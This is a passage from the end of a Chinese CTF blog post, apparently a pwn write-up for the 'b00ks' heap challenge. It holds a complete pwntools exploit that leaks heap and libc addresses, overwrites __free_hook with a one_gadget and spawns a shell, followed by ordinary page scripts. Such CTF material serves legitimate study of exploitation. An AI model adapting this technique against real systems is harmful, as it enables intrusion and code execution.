+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;info&quot;</span><br><br>binary = ELF(<span class="hljs-string">&quot;./b00ks&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/zino/workspace/CTF/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br>io = process(<span class="hljs-string">&quot;./b00ks&quot;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createbook</span>(<span class="hljs-params">name_size, name, des_size, des</span>):</span><br>    io.readuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    io.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    io.readuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(name_size))<br>    io.readuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    io.sendline(name)<br>    io.readuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(des_size))<br>    io.readuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    io.sendline(des)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printbook</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):</span><br>    io.readuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    io.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>    io.readuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">id</span>):<br>        book_id = <span class="hljs-built_in">int</span>(io.readline()[:-<span class="hljs-number">1</span>])<br>        io.readuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>        book_name = io.readline()[:-<span class="hljs-number">1</span>]<br>        io.readuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>        book_des = io.readline()[:-<span class="hljs-number">1</span>]<br>        io.readuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>        book_author = io.readline()[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> book_id, book_name, book_des, book_author<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createname</span>(<span class="hljs-params">name</span>):</span><br>    io.readuntil(<span class="hljs-string">&quot;name: &quot;</span>)<br>    io.sendline(name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">changename</span>(<span class="hljs-params">name</span>):</span><br>    io.readuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    io.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br>    io.readuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    io.sendline(name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">editbook</span>(<span class="hljs-params">book_id, new_des</span>):</span><br>    io.readuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    io.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    io.readuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    io.writeline(<span class="hljs-built_in">str</span>(book_id))<br>    io.readuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    io.sendline(new_des)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deletebook</span>(<span class="hljs-params">book_id</span>):</span><br>    io.readuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    io.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    io.readuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(book_id))<br>    <br><span class="hljs-comment"># gdb.attach(io)</span><br>sleep(<span class="hljs-number">3</span>)<br>createname(<span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">32</span>)<br>createbook(<span class="hljs-number">0xd0</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>createbook(<span class="hljs-number">0x21000</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">0x21000</span>, <span class="hljs-string">&quot;b&quot;</span>)<br><br><br>book_id_1, book_name, book_des, book_author = printbook(<span class="hljs-number">1</span>)<br>book1_addr = u64(book_author[<span class="hljs-number">32</span>:<span class="hljs-number">32</span>+<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;book1_address:&quot;</span> + <span class="hljs-built_in">hex</span>(book1_addr))<br><br>payload = p64(<span class="hljs-number">1</span>) + p64(book1_addr + <span class="hljs-number">0x38</span>) + p64(book1_addr + <span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0xffff</span>)<br>editbook(book_id_1, payload)<br>changename(<span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">32</span>)<br><br>book_id_1, book_name, book_des, book_author = printbook(<span class="hljs-number">1</span>)<br>book2_name_addr = u64(book_name.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br>book2_des_addr = u64(book_des.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">&quot;book2 name addr:&quot;</span> + <span class="hljs-built_in">hex</span>(book2_name_addr))<br>log.success(<span class="hljs-string">&quot;book2 des addr:&quot;</span> + <span class="hljs-built_in">hex</span>(book2_des_addr))<br>libc_base = book2_name_addr - <span class="hljs-number">0x5CA010</span><br>log.success(<span class="hljs-string">&quot;libc base:&quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>free_hook = libc_base + libc.symbols[<span class="hljs-string">&quot;__free_hook&quot;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0x4527a</span> <span class="hljs-comment"># 0x45226 0x4527a 0xf03a4 0xf1247</span><br>log.success(<span class="hljs-string">&quot;free_hook:&quot;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>log.success(<span class="hljs-string">&quot;one_gadget:&quot;</span> + <span class="hljs-built_in">hex</span>(one_gadget))<br>editbook(<span class="hljs-number">1</span>, p64(free_hook))<br>editbook(<span class="hljs-number">2</span>, p64(one_gadget))<br><br>deletebook(<span class="hljs-number">2</span>)<br><br>io.interactive()<br></code></pre></div></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/Pwn/">Pwn</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%A0%86/">堆</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，著作权归作者所有，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/posts/5919fc07/">
+                        <span class="hidden-mobile">内核调试分析入门</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    
+      <script type="text/javascript">
+        var disqus_config = function() {
+          this.page.url = 'https://zino00.github.io/posts/4e6f3d50/';
+          this.page.identifier = '/posts/4e6f3d50/';
+        };
+        Fluid.utils.loadComments('#disqus_thread', function() {
+          var d = document, s = d.createElement('script');
+          s.src = '//' + 'fluid' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        });
+      </script>
+    
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a  rel="nofollow noopener"><span>Copyrights © 2021</span></a> <i class="iconfont icon-love"></i> <a  target="_blank" rel="nofollow noopener"><span>Zino</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?d1745c2e21adaa6ae90b93f4f4d22da9";
+      var s = document.getElementsByTagName("script")[0]; 
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+    
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- KaTeX -->
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.10/dist/katex.min.css" />
+  
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?f45dcd001d67e8f9d84f91248ea31abf";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
